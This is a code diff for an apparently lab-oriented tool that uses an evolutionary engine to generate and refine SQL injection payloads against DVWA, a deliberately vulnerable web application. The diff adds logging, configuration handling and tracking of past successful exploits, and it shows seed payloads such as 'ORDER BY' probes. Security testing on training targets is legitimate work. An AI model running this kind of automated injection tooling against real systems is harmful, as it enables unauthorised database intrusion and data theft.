@@ -21,25 +21,37 @@ def run_prometheus():
     exp_manager = ExperienceManager()
     extractor = DataExtractor()
     
+    print("[*] Stage: Configuration Loading...", flush=True)
     target_user = os.getenv("TARGET_USER", "admin")
     target_pass = os.getenv("TARGET_PASS", "password")
     target_name = os.getenv("TARGET_NAME", "default")
+    target_security = os.getenv("TARGET_SECURITY", "medium")
     
-    # Force medium security as requested by user workflow
-    target_security = "medium" 
+    def safe_int(val, default):
+        try:
+            if val is None or str(val).strip() == "" or str(val).lower() == "undefined":
+                return default
+            return int(val)
+        except:
+            return default
+
+    pop_size = safe_int(os.getenv("POPULATION_SIZE"), 12)
+    max_gens = safe_int(os.getenv("MAX_GENERATIONS"), 30)
     
-    pop_size = int(os.getenv("POPULATION_SIZE", "12"))
-    max_gens = int(os.getenv("MAX_GENERATIONS", "30"))
+    print(f"[*] Config: Target={target_name}, Security={target_security}, Pop={pop_size}, MaxGens={max_gens}", flush=True)
     
     # Phase 0: Ensure Target Profile
+    print("[*] Stage: Database Initialization...", flush=True)
     exp_manager.save_target_profile(client.base_url, target_name=target_name)
 
     # المرحلة 1 و 2: تسجيل الدخول وضبط الحماية
+    print("[*] Stage: Target Authentication...", flush=True)
     if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
         print("[!] Failed to establish session.", flush=True)
         return
 
     # المرحلة 3: التوجه للحقن (تعيين الإعدادات مباشرة بدون استكشاف)
+    print("[*] Stage: Strategy Setup...", flush=True)
     inj_type = "QUOTELESS_STRING" # Default for Medium
     db_type = "MySQL"
     disable_quotes = True 
@@ -47,11 +59,12 @@ def run_prometheus():
     print(f"[*] Targeting Target '{target_name}' @ {client.base_url}", flush=True)
     
     # Load payloads from database API
-    print("[*] Loading base payloads from Database...", flush=True)
+    print("[*] Stage: Loading Base Payloads...", flush=True)
     base_payloads = client.fetch_base_payloads()
     
     # Fallback/Default payloads if DB is empty or inaccessible
     if not base_payloads:
+        print("[!] DB Payloads empty, using internal seeds.", flush=True)
         base_payloads = [
             # --- STRUCTURE & DISCOVERY SEEDS (30+) ---
             *[f"1 ORDER BY {i}" for i in range(1, 21)],
@@ -117,9 +130,10 @@ def run_prometheus():
 
     # المرحلة ٤: التقاط "الخط الأساسي" (Baseline)
     # نستخدم رقم "1" كمرجع لأنه يعيد بيانات الأدمن بشكل شرعي، وذلك لمنع النتائج الكاذبة.
-    print("[*] Capturing Baseline (Normal request for '1')...", flush=True)
+    print("[*] Stage: Capturing Baseline (Testing '1')...", flush=True)
     baseline_response = client.send_request("1")
 
+    print("[*] Stage: Evolutionary Engine Initialization...", flush=True)
     island = IslandManager(
         client, 
         base_payloads, 
@@ -133,7 +147,18 @@ def run_prometheus():
     
     start_gen = island.current_gen
     max_generations = start_gen + max_gens
-    successful_payloads = set(island.hall_of_fame)
+    
+    print(f"[*] Resuming from generation {start_gen}, target end generation: {max_generations}", flush=True)
+    
+    # Load historical successes to avoid duplication and track progress
+    print("[*] Stage: Loading Historical Successes...", flush=True)
+    historical_exploits = exp_manager.get_all_exploits()
+    successful_payloads = {e[0] for e in historical_exploits} if historical_exploits else set()
+    print(f"[*] Loaded {len(successful_payloads)} historical successes.", flush=True)
+
+    if start_gen >= max_generations:
+        print(f"[!] Target generation already reached ({start_gen} >= {max_generations}). Use a larger MAX_GENERATIONS to continue.", flush=True)
+        return
 
     for gen in range(start_gen, max_generations):
         print(f"\n[+] Processing generation {gen + 1} of {max_generations}...", flush=True)
